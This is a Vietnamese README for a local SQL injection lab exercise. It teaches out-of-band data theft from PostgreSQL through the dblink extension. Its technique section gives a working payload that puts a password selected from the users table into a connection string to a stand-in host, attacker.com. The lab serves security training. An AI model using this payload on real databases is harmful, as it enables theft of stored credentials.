# SQLi-042: PostgreSQL OOB HTTP via dblink Extension

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên PostgreSQL bằng `dblink` extension để exfiltrate data qua connection attempts.

## 📝 Mô Tả

**Scenario:** PostgreSQL server với `dblink` extension đã được cài đặt. Có thể tạo connection đến external server và gửi data trong connection string.

**URL:** `http://localhost:5042/product?id=1`

## 🎓 Kỹ Thuật

```sql
-- dblink connection attempt với data trong password
SELECT * FROM dblink('host=attacker.com user=a password='||(SELECT password FROM users LIMIT 1)||' dbname=a','SELECT 1') RETURNS (i int);
```

Attacker nhận được connection attempt với password = extracted data.

## 🚀 Run Lab

```bash
docker-compose up -d
curl http://localhost:5042/product?id=1
```

## 💡 Hints

1. dblink extension phải được tạo: `CREATE EXTENSION dblink`
2. Connection string chứa data được exfiltrate
3. Có thể dùng DNS hoặc TCP connection

## 🏁 Flag: `FLAG{...}`
